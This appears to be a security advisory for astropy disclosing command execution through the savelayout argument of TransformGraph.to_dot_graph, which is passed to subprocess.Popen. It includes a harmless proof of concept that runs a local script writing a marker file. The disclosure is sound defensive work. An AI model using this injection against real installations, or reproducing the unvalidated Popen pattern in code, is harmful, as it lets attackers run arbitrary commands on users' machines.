summary: "RCE in TranformGraph().to_dot_graph function\n### Summary\nRCE due to improper input\
  \ validation in TranformGraph().to_dot_graph function\n\n### Details\n\nDue to improper input\
  \ validation a malicious user can provide a command or a script file as a value to `savelayout`\
  \ argument, which will be placed as the first value in a list of arguments passed to `subprocess.Popen`.\
  \ \nhttps://github.com/astropy/astropy/blob/9b97d98802ee4f5350a62b681c35d8687ee81d91/astropy/coordinates/transformations.py#L539\n\
  Although an error will be raised, the command or script will be executed successfully.\n\n\
  ### PoC\n\n```shell\n$ cat /tmp/script\n#!/bin/bash\necho astrorce > /tmp/poc.txt\n```\n```shell\n\
  $ python3\nPython 3.9.2 (default, Feb 28 2021, 17:03:44) \n[GCC 10.2.1 20210110] on linux\n\
  Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from astropy.coordinates.transformations\
  \ import TransformGraph\n>>> tg = TransformGraph()\n>>> tg.to_dot_graph(savefn=\"/tmp/1.txt\"\
  , savelayout=\"/tmp/script\")\nTraceback (most recent call last):\n  File \"<stdin>\", line\
  \ 1, in <module>\n  File \"/home/u32i/.local/lib/python3.9/site-packages/astropy/coordinates/transformations.py\"\
  , line 584, in to_dot_graph\n    stdout, stderr = proc.communicate(dotgraph)\n  File \"/usr/lib/python3.9/subprocess.py\"\
  , line 1134, in communicate\n    stdout, stderr = self._communicate(input, endtime, timeout)\n\
  \  File \"/usr/lib/python3.9/subprocess.py\", line 1961, in _communicate\n    input_view =\
  \ memoryview(self._input)\nTypeError: memoryview: a bytes-like object is required, not 'str'\n\
  >>> \n```\n```shell\n$ cat /tmp/poc.txt\nastrorce\n```\n\n### Impact\ncode execution on the\
  \ user's machine"
